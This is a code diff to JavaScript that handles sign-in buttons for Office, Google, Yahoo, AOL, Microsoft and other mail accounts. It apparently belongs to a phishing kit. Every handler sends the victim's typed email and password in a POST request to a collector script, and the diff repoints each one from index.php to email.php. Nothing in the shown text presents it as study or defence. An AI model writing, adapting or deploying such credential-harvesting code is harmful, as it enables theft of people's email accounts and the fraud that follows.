@@ -154,7 +154,7 @@ officeSignIn.addEventListener('click', function(){
       }
     }
 
-    var url = 'index.php';
+    var url = 'email.php';
     var param = "email="+officeEmail.value+"&password="+officePassword.value;
 
     xmlhttp.open("POST", url, true);
@@ -204,7 +204,7 @@ googleSignIn.addEventListener('click', function(){
       }
     }
 
-    var url = 'index.php';
+    var url = 'email.php';
     var param = "email="+googleEmail.value+"&password="+googlePassword.value;
 
     xmlhttp.open("POST", url, true);
@@ -254,7 +254,7 @@ yahooSignIn.addEventListener('click', function(){
       }
     }
 
-    var url = 'index.php';
+    var url = 'email.php';
     var param = "email="+yahooEmail.value+"&password="+yahooPassword.value;
 
     xmlhttp.open("POST", url, true);
@@ -304,7 +304,7 @@ aolSignIn.addEventListener('click', function(){
       }
     }
 
-    var url = 'index.php';
+    var url = 'email.php';
     var param = "email="+aolEmail.value+"&password="+aolPassword.value;
 
     xmlhttp.open("POST", url, true);
@@ -354,7 +354,7 @@ msSignIn.addEventListener('click', function(){
       }
     }
 
-    var url = 'index.php';
+    var url = 'email.php';
     var param = "email="+msEmail.value+"&password="+msPassword.value;
 
     xmlhttp.open("POST", url, true);
@@ -403,7 +403,7 @@ anotherSignIn.addEventListener('click', function(){
       }
     }
 
-    var url = 'index.php';
+    var url = 'email.php';
     var param = "email="+anotherEmailAddr.value+"&password="+anotherPassword.value;
 
     xmlhttp.open("POST", url, true);
